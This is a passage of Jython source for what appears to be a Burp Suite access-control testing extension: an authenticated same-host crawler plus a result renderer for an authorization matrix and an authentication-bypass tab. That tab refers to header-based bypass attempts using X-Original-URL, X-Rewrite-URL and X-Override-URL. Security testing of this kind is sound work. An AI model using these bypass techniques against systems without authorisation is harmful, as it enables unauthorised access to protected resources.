        self._btnAuthNewUserAdd.setEnabled(False)
        self._tbAuthNewUser.setEnabled(False)
        self._cbSiteMapDepth.setEnabled(False)
        self._btnSiteMapGeneratorRun.setEnabled(False)


        _userURLs = []
        _userURLs.append(_urlAdd)
        folderDepth = 0
        crawledURLs = 0
        header = self._tbAuthHeader.getText()
        userLinks = _urlAdd + "\n"

        for _url in _userURLs:
            try:
                # changing new url path in the request header
                header =  header.replace(str(header.splitlines()[0]), header.splitlines()[0].split(" ", 2)[0] + " /" + _url.split('/',3)[3] + " " + header.splitlines()[0].split(" ", 2)[2])

                # header methods
                if "GET" in header[:3]:
                    # request was in GET method and will be in POST
                    if self._cbAuthGETPOST.getSelectedIndex() == 1:
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                else:
                    # request was in POST alike method and will be in GET
                    if self._cbAuthGETPOST.getSelectedIndex() == 0:
                        header = self._callbacks.getHelpers().toggleRequestMethod((header))
                
                portNum = 80
                if urlparse.urlparse(_url).port:
                    portNum = urlparse.urlparse(_url).port
                else:
                    if urlparse.urlparse(_url).scheme == "https":
                        portNum = 443

                _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(_url).hostname, portNum, urlparse.urlparse(_url).scheme), header)
                responseStatus = str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode())
                if _urlAdd == _url:
                    if not responseStatus.startswith("2"):
                        self._lblAuthNotification.text = "The user's header is returning 'HTTP " + responseStatus + "'. Please provide a valid header and URL."
                        self._btnAuthNewUserAdd.setEnabled(True)
                        self._tbAuthNewUser.setEnabled(True)
                        self._cbSiteMapDepth.setEnabled(True)
                        self._btnSiteMapGeneratorRun.setEnabled(True)
                        return
                
                msgBody = self._helpers.bytesToString(_httpReqRes.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset():])

                if msgBody:
                    links = re.findall("(https?://[^\\s\'\"<]+)", msgBody, re.IGNORECASE)
                    for link in links:
                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]
                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(url_regex, link, re.IGNORECASE)) and "/." not in link and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                            _userURLs.append(link)
                            userLinks = userLinks + link + "\n"

                    links = re.findall("<a\\s+[^>]*?href=[\'|\"](.*?)[\'\"].*?>", msgBody, re.IGNORECASE)
                    for link in (links.pop(0) for _ in xrange(len(links))):
                        if not ".." in link:
                            link = link.replace("/.", "/")
                        if link == ".":
                            link = "/"
                        if "%3a" in link[0:10]:
                            link =  urllib.unquote(link)

                        if '"' in link or '%22' in link or '%3c' in link or '<' in link or 'script' in link:
                            # abnormal urls to be excluded
                            link = ""
                            continue
                        elif link.startswith('/'):
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + link
                        elif link.startswith('#'):
                            if link == '#':
                                link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + urlparse.urlparse(_url)[2]
                            else:
                                link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + urlparse.urlparse(_url)[2] + link
                        elif link.startswith('..'):
                            path = urlparse.urlparse(_url)[2]
                            if not path.endswith('/'):
                                path = str(urlparse.urlparse(_url)[2]).rsplit('/', 1)[0] + "/"
                            _endswith =""
                            if link.endswith('/'):
                                _endswith ="/"
                            link = urlparse.urlparse(_url).scheme + "://" + urlparse.urlparse(_url)[1] + str(posixpath.normpath(path + link)) + _endswith
                        elif not link.startswith('http') and link:
                            if _url.endswith('/'):
                                link = _url.rsplit("/", 2)[0] + '/' + link
                            else:
                                link = _url.rsplit("/", 1)[0] + '/' + link
                        else: 
                            link = ""
                            continue

                        _ext = os.path.splitext(urlparse.urlparse(link).path)[1]

                        if link not in _userURLs and link and urlparse.urlparse(_url).hostname == urlparse.urlparse(link).hostname and not any(re.findall(url_regex, link, re.IGNORECASE)) and "/." not in link and not any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                            _userURLs.append(link)
                            userLinks = userLinks + link + "\n"
                            self._lblAuthNotification.text = "The crawler has found '" + str(len(_userURLs)) + "' links so far, and it is still in progress: '" + str(_userURLs.index(_url) + 1) + "/" + str(crawledURLs + 1) + "', current folder depth: '" + str(folderDepth) + "'."

                if _userURLs.index(_url) == crawledURLs:
                    if folderDepth == self._cbSiteMapDepth.getSelectedIndex():
                        break
                    crawledURLs = len(_userURLs) - 1
                    folderDepth = folderDepth + 1
                
            except:
                self._lblAuthNotification.text = str(sys.exc_info()[1])
        
        self._tbAuthURL.setText(userLinks)
        if len(_userURLs) > 1:
            self._lblAuthNotification.text = "The crawler has just finished, and '" + str(len(_userURLs)) + "' links have been found with folder depth '"+ str(self._cbSiteMapDepth.getSelectedIndex()) +"'. Other hosts than user's session are ignored." 
        else:
            self._lblAuthNotification.text = "The crawler has just finished, and no any links have been found." 
        self._btnAuthNewUserAdd.setEnabled(True)
        self._tbAuthNewUser.setEnabled(True)
        self._cbSiteMapDepth.setEnabled(True)
        self._btnSiteMapGeneratorRun.setEnabled(True)
        return

class UserEnabledRenderer(TableCellRenderer):
    _colorsRed = False
    _colorsOrange = False
    _colorsYellow = False
    def __init__(self, defaultCellRender, userList, tipMessages):
        UserEnabledRenderer._colorsRed = False
        UserEnabledRenderer._colorsOrange = False
        UserEnabledRenderer._colorsYellow = False
        self._defaultCellRender = defaultCellRender
        self.userList = userList
        self.tipMessages = tipMessages
        self.focusX = -1
        self.focusY = -1
        self.colorsUser = [Color(204, 229, 255), Color(204, 255, 204), Color(204, 204, 255), Color(190,220,210)]
        self.colorsAlert = [Color.white, Color(255, 153, 153), Color(255, 218, 185), Color(255, 255, 204), Color(233, 233, 233), Color(255, 204, 204)]

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        cell = self._defaultCellRender.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column)
        toolTipMessage = ""
        cell.setBackground(self.colorsAlert[0])
        if len(self.userList[0]) < 10:
            # Authorization Matrix Tab
            try:
                if column == 0:
                    toolTipMessage = "URL list."
                elif table.getValueAt(row, column) and not table.getValueAt(row, column).startswith("HTTP 2") and not table.getValueAt(row, column).startswith("HTTP 3"):
                    # error or http 4XX/5XX
                    cell.setBackground(self.colorsAlert[4])
                    toolTipMessage = "The request returns HTTP 4XX/5xx response!"
                elif column == 1:
                    # no auth
                    if _colorful:
                        for y in range(2, table.getColumnCount()):
                            if table.getValueAt(row, 0) in self.userList[y - 1]:
                                if table.getValueAt(row, y) == table.getValueAt(row, column):
                                    if table.getValueAt(row, y).startswith("HTTP 2"):
                                        cell.setBackground(self.colorsAlert[1])
                                        toolTipMessage = "The URL returns HTTP 2XX without authentication, and the response is same as URL owner!"
                                    elif table.getValueAt(row, y).startswith("HTTP 3"):
                                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                            cell.setBackground(self.colorsAlert[3])
                                            toolTipMessage = "The URL returns HTTP 3XX without authentication, but the response is same as URL owner!"
                                elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                    if not cell.getBackground() == self.colorsAlert[1]:
                                        cell.setBackground(self.colorsAlert[2])
                                        toolTipMessage = "The URL returns same HTTP response code with URL owner, but no authentication!"
                elif table.getValueAt(row, 0) in self.userList[column - 1]:
                    cell.setBackground(self.colorsUser[column - 2])
                    toolTipMessage = "Http response of the user's own URL!"
                else:    
                    # other users
                    if _colorful:
                        for y in range(2, table.getColumnCount()):
                            if table.getValueAt(row, 0) in self.userList[y - 1]:
                                if table.getValueAt(row, y) == table.getValueAt(row, column):
                                    if table.getValueAt(row, y).startswith("HTTP 2"):
                                        cell.setBackground(self.colorsAlert[1])
                                        toolTipMessage = "The URL is not in the user's list, but the response (HTTP 2XX) is same as URL owner!"
                                    elif table.getValueAt(row, y).startswith("HTTP 3"):
                                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                            cell.setBackground(self.colorsAlert[3])
                                            toolTipMessage = "The URL is not in the user's list, but the response (HTTP 3XX) is same as URL owner!"
                                elif table.getValueAt(row, y)[:8] == table.getValueAt(row, column)[:8]:
                                    if not cell.getBackground() == self.colorsAlert[1]:    
                                        cell.setBackground(self.colorsAlert[2])
                                        toolTipMessage = "The URL is not in the user's list, but returns same HTTP response code with URL owner!"
                cell.setToolTipText(toolTipMessage)

                if hasFocus:
                    self.focusX = row
                    self.focusY = column
                    cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                    table.repaint()
                elif self.focusX == row and column == 0:
                    cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                    table.repaint()
            except:
                #print str(sys.exc_info()[1])
                pass

        else:
            #Authentication Bypass Tab
            try:
                if table.getValueAt(row, column):
                    toolTipMessage = self.tipMessages[row][column]

                    if column == 0:
                        if cell.getBackground() == self.colorsAlert[0]:
                            for y in range(1, table.getColumnCount()):
                                if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[1]:
                                    cell.setBackground(self.colorsAlert[1])
                                    UserEnabledRenderer._colorsRed = True
                                    break
                            if not cell.getBackground() == self.colorsAlert[1]:
                                for y in range(1, table.getColumnCount()):
                                    if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[2]:
                                        cell.setBackground(self.colorsAlert[2])
                                        UserEnabledRenderer._colorsOrange = True
                                        break
                            if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2]:
                                for y in range(1, table.getColumnCount()):
                                    if table.getCellRenderer(row, y).getTableCellRendererComponent(table, value, isSelected, hasFocus, row, y).getBackground() == self.colorsAlert[3]:
                                        cell.setBackground(self.colorsAlert[3])
                                        UserEnabledRenderer._colorsYellow = True
                                        break
                    elif column == 1:
                        if str(table.getValueAt(row, column)).startswith("2"):
                            cell.setBackground(self.colorsAlert[1])
                            UserEnabledRenderer._colorsRed = True
                            toolTipMessage = "The response returns HTTP 2XX, even though all session identifiers have been removed!\n" + self.tipMessages[row][column]
                    else:
                        if column == 32:
                          toolTipMessage = "'X-Original-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-"):
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."
                        elif column == 33:
                          toolTipMessage = "'X-Rewrite-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-"):
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."
                        elif column == 34:
                          toolTipMessage = "'X-Override-URL' parameter has been added to the header."
                          if str(table.getValueAt(row, column)).endswith("-"):
                              toolTipMessage = self.tipMessages[row][column] + ". '-' shows it returns same response with '/' root path."

                        if not str(table.getValueAt(row, 1)).startswith("2"):
                            if str(table.getValueAt(row, column)).startswith("2") and not str(table.getValueAt(row, column)).endswith("-"):
                                if str(table.getValueAt(row, column)).endswith("(EmptyBody)"):
                                    toolTipMessage = "The bypass attempt returns HTTP 2XX, but no response body!\n" + self.tipMessages[row][column]
                                else:
                                    cell.setBackground(self.colorsAlert[1])
                                    UserEnabledRenderer._colorsRed = True
                                    toolTipMessage = "The bypass attempt returns HTTP 2XX!\n" + self.tipMessages[row][column]

                    cell.setToolTipText(toolTipMessage)

                    if hasFocus:
                        self.focusX = row
                        self.focusY = column
                        if not cell.getBackground() == self.colorsAlert[1] and not cell.getBackground() == self.colorsAlert[2] and not cell.getBackground() == self.colorsAlert[3]:
                            cell.setBackground(Color(219,219,219))
                        cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                        table.repaint()
                    elif self.focusX == row and column == 0:
                        cell.setFont(cell.getFont().deriveFont(Font.BOLD | Font.ITALIC))
                        table.repaint()
            except:
                # print str(sys.exc_info()[1])
                pass
        return cell

class CustomDefaultTableModel(DefaultTableModel):
    def __init__(self, data, headings):
        DefaultTableModel.__init__(self, data, headings)

    def isCellEditable(self, row, col):
        return False






class URLFilter:
    def __init__(self):
        self.patterns_seen = set()

    def _normalize_url(self, full_url):
        parsed = urlparse.urlparse(full_url)
        path = parsed.path.strip("/")
        norm_parts = path.split("/")

        normalized_path_parts = []
        uuid_like = re.compile(
            r"^[a-f0-9]{8}-[a-f0-9]{4}-[1-5][a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$", re.IGNORECASE
        )

        for part in norm_parts:
            if uuid_like.match(part):
                normalized_path_parts.append("{id}")
            elif part.isdigit() and int(part) >= 10000:
                normalized_path_parts.append("{id}")
            elif re.match(r"^[a-zA-Z0-9]+$", part) and sum(c.isdigit() for c in part) >= 3:
                normalized_path_parts.append("{id}")
            else:
                normalized_path_parts.append(part)

        normalized = "/" + "/".join(normalized_path_parts)

        if parsed.query:
            query_params = parsed.query.split("&")
            norm_query_parts = []
            for param in query_params:
                if "=" in param:
                    key, value = param.split("=", 1)
                    if uuid_like.match(value) or (value.isdigit() and int(value) >= 10000) or (re.match(r"^[a-zA-Z0-9]+$", value) and sum(c.isdigit() for c in value) >= 3):
                        value = "{id}"
                    norm_query_parts.append(key + "=" + value)
                else:
                    norm_query_parts.append(param)
            norm_query_parts.sort()
            normalized += "?" + "&".join(norm_query_parts)

        return normalized

    def should_process(self, url):
        norm = self._normalize_url(url)
        if norm in self.patterns_seen:
            return False
        else:
            self.patterns_seen.add(norm)
            return True


class MyFocusListener(FocusListener):
    def __init__(self, textPane, placeholder):
        self.textPane = textPane
        self.placeholder = placeholder

    def focusGained(self, event):
        if self.textPane.getText() == self.placeholder:
            self.textPane.setText("")
            self.textPane.setForeground(Color.BLACK)

    def focusLost(self, event):
        if self.textPane.getText().strip() == "":
            self.textPane.setText(self.placeholder)
            self.textPane.setForeground(Color.GRAY)
